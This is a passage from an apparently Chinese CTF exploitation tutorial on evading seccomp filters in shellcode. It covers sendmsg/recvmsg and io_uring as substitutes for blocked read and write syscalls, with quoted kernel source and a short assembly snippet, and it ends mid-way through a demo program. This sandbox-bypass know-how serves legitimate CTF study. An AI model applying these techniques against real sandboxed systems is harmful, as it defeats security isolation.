<p>在真实的远程解题环境中，我们的主机几乎一定是位于某个内网之中，一般是好几层内网，题目环境位于外网。根据计网的基础知识我们可以知道，我们可以主动连接外网的题目接口，但是题目的docker本身不能主动连接到我们的主机。因此sendto和recvfrom不能用于发送网络数据包。如果需要将数据发送到文件描述符，后面三个参数全传0即可。此时<code>sendto</code>和<code>recvfrom</code>即可忽略后面3个参数，与<code>write</code>和<code>read</code>无异了。但是需要注意的是，在这种情况下，能够发送的前提条件是这个文件描述符是网络文件描述符。如远程连接题目环境时，程序本身的标准输入和标准输出实际上是被重定向到了网络文件描述符中，因此我们可以通过<code>sendto</code>让远程主机发送数据到本机，也可以通过<code>recvfrom</code>向远程主机发送数据，在内核中可通过<code>sockfd_lookup_light</code>函数根据文件描述符获取套接字实例。对于在远程中使用<code>open</code>等系统调用打开的文件描述符，由于其本身并不是网络文件描述符，因此不能使用上述两个系统调用，否则会返回<code>-ENOTSOCK</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sys_recvfrom(<span class="type">int</span> fd, <span class="type">void</span> __user *ubuf, <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">		   <span class="keyword">struct</span> sockaddr __user *addr, <span class="type">int</span> __user *addr_len)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> =</span> &#123;</span><br><span class="line">		<span class="comment">/* Save some cycles and don&#x27;t copy the address if not needed */</span></span><br><span class="line">		.msg_name = addr ? (<span class="keyword">struct</span> sockaddr *)&amp;address : <span class="literal">NULL</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>;</span></span><br><span class="line">	<span class="type">int</span> err, err2;</span><br><span class="line">	<span class="type">int</span> fput_needed;</span><br><span class="line"></span><br><span class="line">	err = import_single_range(ITER_DEST, ubuf, size, &amp;iov, &amp;msg.msg_iter);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(err))</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line">	<span class="keyword">if</span> (!sock)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sock-&gt;file-&gt;f_flags &amp; O_NONBLOCK)</span><br><span class="line">		flags |= MSG_DONTWAIT;</span><br><span class="line">	err = sock_recvmsg(sock, &amp;msg, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err &gt;= <span class="number">0</span> &amp;&amp; addr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		err2 = move_addr_to_user(&amp;address,</span><br><span class="line">					 msg.msg_namelen, addr, addr_len);</span><br><span class="line">		<span class="keyword">if</span> (err2 &lt; <span class="number">0</span>)</span><br><span class="line">			err = err2;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fput_light(sock-&gt;file, fput_needed);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> socket *<span class="title function_">sockfd_lookup_light</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> *err, <span class="type">int</span> *fput_needed)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">	*err = -EBADF;</span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		sock = sock_from_file(f.file);</span><br><span class="line">		<span class="keyword">if</span> (likely(sock)) &#123;</span><br><span class="line">			*fput_needed = f.flags &amp; FDPUT_FPUT;</span><br><span class="line">			<span class="keyword">return</span> sock;</span><br><span class="line">		&#125;</span><br><span class="line">		*err = -ENOTSOCK;</span><br><span class="line">		fdput(f);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="d-sendmsg-recvmsg-nr46-47"><a class="markdownIt-Anchor" href="#d-sendmsg-recvmsg-nr46-47"></a> D. sendmsg + recvmsg (nr=46, 47)</h2>
<p>这两个方法与<code>sendto</code>、<code>recvfrom</code>的功能类似，在内核中前面两个函数在实现时调用的就是<code>sendmsg</code>和<code>recvmsg</code>。如果需要直接使用这两个系统调用，则必须构建<code>msg</code>结构体实例。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sendmsg</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> user_msghdr* msg, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">recvmsg</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> user_msghdr* msg, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_msghdr</span> &#123;</span></span><br><span class="line">	<span class="type">void</span>		__user *msg_name;	<span class="comment">/* ptr to socket address structure */</span></span><br><span class="line">	<span class="type">int</span>		msg_namelen;		<span class="comment">/* size of socket address structure */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>	__<span class="title">user</span> *<span class="title">msg_iov</span>;</span>	<span class="comment">/* scatter/gather array */</span></span><br><span class="line">	<span class="type">__kernel_size_t</span>	msg_iovlen;		<span class="comment">/* # elements in msg_iov */</span></span><br><span class="line">	<span class="type">void</span>		__user *msg_control;	<span class="comment">/* ancillary data */</span></span><br><span class="line">	<span class="type">__kernel_size_t</span>	msg_controllen;		<span class="comment">/* ancillary data buffer length */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>	msg_flags;		<span class="comment">/* flags on received message */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里也是使用了<code>iovec</code>结构体来表示缓冲区。由于我们没有获取套接字，因此<code>msg_name</code>和<code>msg_namelen</code>均为0，<code>msg_iov</code>和<code>msg_iovlen</code>则按照缓冲区的地址和大小构造即可。下面的3个全部填0，第三个函数参数mode也填0。</p>
<p>示例：输出当前栈顶10个字节的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 1</span><br><span class="line">mov rcx, rsp</span><br><span class="line">xor rdx, rdx</span><br><span class="line">/* struct iovec */</span><br><span class="line">push 10		/* iov_len = 10 */</span><br><span class="line">push rcx	/* iov_base */</span><br><span class="line">mov rcx, rsp</span><br><span class="line">/* struct user_msghdr */</span><br><span class="line">push 0		/* msg_flags = 0 */</span><br><span class="line">push 0		/* msg_controllen = 0 */</span><br><span class="line">push 0		/* msg_control = NULL */</span><br><span class="line">push 1		/* msg_iovlen = 1 */</span><br><span class="line">push rcx	/* msg_iov */</span><br><span class="line">push 0		/* msg_namelen = 0 */</span><br><span class="line">push 0		/* msg_name = 0 */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_sendmsg</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<h2 id="e-io_uring系列-nr425426427"><a class="markdownIt-Anchor" href="#e-io_uring系列-nr425426427"></a> E. io_uring系列 (nr=425,426,427)</h2>
<p>这种绕过seccomp的方式是ACTF-2023赛题master-of-orw的标准解法。这种方式非常巧妙，但也是很花功夫的。</p>
<p>首先介绍一下io_uring是什么东西。</p>
<p>该部分主要参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/380726590">传送门</a></p>
<blockquote>
<p>io_uring 是 Linux 提供的一个异步 I/O 接口。io_uring 在 2019 年加入 Linux 内核，经过了两年的发展，现在已经变得非常强大。<br />
io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter 和 io_uring_register。它们分别用于设置 io_uring 上下文，提交并获取完成任务，以及注册内核用户共享的缓冲区。使用前两个 syscall 已经足够使用 io_uring 接口了。</p>
</blockquote>
<p><code>io_uring</code>维护了两个环形队列结构，其中一个用于保存即将进行的操作，另外一个用于保存已经完成的操作所返回的结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">io_uring_enter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, u32 to_submit, u32 min_complete, u32 flags, <span class="type">const</span> <span class="type">void</span>* argp, <span class="type">size_t</span> argsz)</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>用户通过调用 <code>io_uring_setup</code> 初始化一个新的 <code>io_uring</code> 上下文。该函数返回一个文件描述符，并将 <code>io_uring</code> 支持的功能、以及各个数据结构在 <code>fd</code> 中的偏移量存入 params。用户根据偏移量将 <code>fd</code> 映射到内存 (<code>mmap</code>) 后即可获得一块内核用户共享的内存区域。这块内存区域中，有 <code>io_uring</code> 的上下文信息：提交队列信息 (<code>SQ_RING</code>) 和完成队列信息 (<code>CQ_RING</code>)；还有一块专门用来存放提交队列元素的区域 (<code>SQEs</code>)。<code>SQ_RING</code> 中只存储 <code>SQE</code> 在 <code>SQEs</code> 区域中的序号，<code>CQ_RING</code> 存储完整的任务完成数据。</p>
</blockquote>
<blockquote>
<p>io_uring_setup 设计的巧妙之处在于，内核通过一块和用户共享的内存区域进行消息的传递。在创建上下文后，任务提交、任务收割等操作都通过这块共享的内存区域进行，在 IO_SQPOLL 模式下（后文将详细介绍），可以完全绕过 Linux 的 syscall 机制完成需要内核介入的操作（比如读写文件），大大减少了 syscall 切换上下文、刷 TLB 的开销。</p>
</blockquote>
<p>从上面的描述中，我们可以看到<code>io_uring</code>是能够在不使用读写等系统调用的情况下完成打开、读写文件的操作的。考虑到使用<code>io_uring</code>的操作流程较为复杂，我们可以尝试首先使用C语言完成文件读写功能，然后再考虑如何使用汇编语言编写。</p>
<p>在不同的Linux版本中，<code>io_uring</code>在内核中的具体实现结构体等数据类型有一定的不同。在Linux 5.12.0与5.15.139这两个版本中，有<code>struct io_op_def io_op_defs[]</code>这个数据结构，它定义了<code>io_uring</code>支持的操作，以及在<code>io_uring</code>中的一些参数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_op_def</span> &#123;</span></span><br><span class="line">	<span class="comment">/* needs req-&gt;file assigned */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* hash wq insertion if file is a regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		hash_reg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* unbound wq insertion if file is a non-regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		unbound_nonreg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode is not supported by this kernel */</span></span><br><span class="line">	<span class="type">unsigned</span>		not_supported : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* set if opcode supports polled &quot;wait&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span>		pollin : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		pollout : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* op supports buffer selection */</span></span><br><span class="line">	<span class="type">unsigned</span>		buffer_select : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* do prep async if is going to be punted */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_async_setup : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* should block plug */</span></span><br><span class="line">	<span class="type">unsigned</span>		plug : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* size of async data needed, if any */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>		async_size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_op_def</span> <span class="title">io_op_defs</span>[] =</span> &#123;</span><br><span class="line">	[IORING_OP_NOP] = &#123;&#125;,</span><br><span class="line">	[IORING_OP_READV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollin			= <span class="number">1</span>,</span><br><span class="line">		.buffer_select		= <span class="number">1</span>,</span><br><span class="line">		.needs_async_setup	= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.async_size		= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_async_rw),</span><br><span class="line">	&#125;,</span><br><span class="line">	[IORING_OP_WRITEV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.hash_reg_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollout		= <span class="number">1</span>,</span><br><span class="line">		.needs_async_setup	= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.async_size		= <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_async_rw),</span><br><span class="line">	&#125;,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在6.6.2版本中，对原有的<code>io_op_def</code>结构体进行了扩充，并改名为<code>io_issue_def</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> &#123;</span></span><br><span class="line">	<span class="comment">/* needs req-&gt;file assigned */</span></span><br><span class="line">	<span class="type">unsigned</span>		needs_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* should block plug */</span></span><br><span class="line">	<span class="type">unsigned</span>		plug : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* hash wq insertion if file is a regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		hash_reg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* unbound wq insertion if file is a non-regular file */</span></span><br><span class="line">	<span class="type">unsigned</span>		unbound_nonreg_file : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* set if opcode supports polled &quot;wait&quot; */</span></span><br><span class="line">	<span class="type">unsigned</span>		pollin : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		pollout : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>		poll_exclusive : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* op supports buffer selection */</span></span><br><span class="line">	<span class="type">unsigned</span>		buffer_select : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode is not supported by this kernel */</span></span><br><span class="line">	<span class="type">unsigned</span>		not_supported : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* skip auditing */</span></span><br><span class="line">	<span class="type">unsigned</span>		audit_skip : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* supports ioprio */</span></span><br><span class="line">	<span class="type">unsigned</span>		ioprio : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* supports iopoll */</span></span><br><span class="line">	<span class="type">unsigned</span>		iopoll : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* have to be put into the iopoll list */</span></span><br><span class="line">	<span class="type">unsigned</span>		iopoll_queue : <span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* opcode specific path will handle -&gt;async_data allocation if needed */</span></span><br><span class="line">	<span class="type">unsigned</span>		manual_alloc : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> (*issue)(<span class="keyword">struct</span> io_kiocb *, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*prep)(<span class="keyword">struct</span> io_kiocb *, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_issue_def</span> <span class="title">io_issue_defs</span>[] =</span> &#123;</span><br><span class="line">	[IORING_OP_NOP] = &#123;</span><br><span class="line">		.audit_skip		= <span class="number">1</span>,</span><br><span class="line">		.iopoll			= <span class="number">1</span>,</span><br><span class="line">		.prep			= io_nop_prep,</span><br><span class="line">		.issue			= io_nop,</span><br><span class="line">	&#125;,</span><br><span class="line">	[IORING_OP_READV] = &#123;</span><br><span class="line">		.needs_file		= <span class="number">1</span>,</span><br><span class="line">		.unbound_nonreg_file	= <span class="number">1</span>,</span><br><span class="line">		.pollin			= <span class="number">1</span>,</span><br><span class="line">		.buffer_select		= <span class="number">1</span>,</span><br><span class="line">		.plug			= <span class="number">1</span>,</span><br><span class="line">		.audit_skip		= <span class="number">1</span>,</span><br><span class="line">		.ioprio			= <span class="number">1</span>,</span><br><span class="line">		.iopoll			= <span class="number">1</span>,</span><br><span class="line">		.iopoll_queue		= <span class="number">1</span>,</span><br><span class="line">		.prep			= io_prep_rw,</span><br><span class="line">		.issue			= io_read,</span><br><span class="line">	&#125;,</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的两个结构本质上是一样的功能。</p>
<blockquote>
<p><code>io_uring</code> 中几乎每个操作都有对应的准备和执行函数。除了 <code>fsync</code> 这种同步（阻塞）操作，内核中还支持一些异步（非阻塞）调用的操作，比如 Direct I/O 模式下的文件读写。对于这些操作，<code>io_uring</code> 中还会有一个对应的异步准备函数，以 <code>_async</code> 结尾。</p>
</blockquote>
<p>如果我们需要将需要进行的操作传递到内核，则需要使用<code>io_uring_sqe</code>（submission queue entry）这个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u32	cmd_op;</span><br><span class="line">			__u32	__pad1;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">		__u32		xattr_flags;</span><br><span class="line">		__u32		msg_ring_flags;</span><br><span class="line">		__u32		uring_cmd_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	addr_len;</span><br><span class="line">			__u16	__pad3[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u64	addr3;</span><br><span class="line">			__u64	__pad2[<span class="number">1</span>];</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If the ring is initialized with IORING_SETUP_SQE128, then</span></span><br><span class="line"><span class="comment">		 * this field is used for 80 bytes of arbitrary command data</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		__u8	cmd[<span class="number">0</span>];</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>opcode</code>是<code>io_uring</code>的操作码，每一个<code>io_uring</code>操作都对应一个操作码，在<code>/include/uapi/linux/io_uring.h</code>中的匿名枚举类型中进行了定义。这个操作码就和指令的操作码类似，定义了不同的操作类型。<code>fd</code>是该操作的目标文件描述符，无论是打开、读写还是同步等操作，都需要一个文件描述符作为目标文件。结构体中还有一些其他的字段，用于不同操作的参数。</p>
<p>下面，我们通过一个demo程序简单了解一下<code>io_uring</code>的使用方式。（demo来源：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/603522332">传送门</a>，下面的demo经过了改编）</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> 